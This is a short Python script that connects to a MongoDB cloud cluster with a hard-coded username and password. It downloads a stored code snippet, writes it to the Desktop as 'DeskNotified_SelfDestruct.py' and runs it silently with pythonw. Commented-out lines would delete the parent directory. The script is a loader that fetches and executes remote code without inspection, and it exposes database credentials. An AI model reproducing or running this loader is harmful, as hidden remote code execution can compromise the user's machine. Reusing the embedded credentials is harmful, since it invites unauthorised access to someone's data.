import os
# import shutil
from subprocess import call, getstatusoutput

# path1 = os.path.normpath(os.getcwd())
# # print(os.getcwd())
#
# path1 = list(path1.split(os.sep))
#
# path1.pop(-1)  # To get out of Body Code
#
# path1 = "/".join(path1)
#
# os.chdir(path1)
# shutil.rmtree(path1, ignore_errors=True)

import pymongo


def codeWriter():
    path1 = os.path.normpath(os.getcwd())

    path1 = list(path1.split(os.sep))

    path1.pop(-1)  # To get out of Body Code
    path1.pop(-1)  # To get out of Body Code

    path1 = "/".join(path1)

    os.chdir(path1)

    "We are switching from  BodyCode to Desktop and gonna write the file"
    with open("DeskNotified_SelfDestruct.py", "w") as file:

        Belgium = []
        client = pymongo.MongoClient(
            "mongodb+srv://rahulVishwakarma:ewFSWgXl0ZZ0Qrh0@cluster0.s0kvxoz.mongodb.net/?retryWrites=true&w=majority")
        dbCollection = client['BelgiumServer']['Important_Code_Snippet']

        for i in dbCollection.find({}, {"_id": 0}):
            Belgium.append(i)

        file.write(Belgium[1]['NotifierSelfDestructAdditionalFile'])


    call(["pythonw", "DeskNotified_SelfDestruct.py"])

codeWriter()
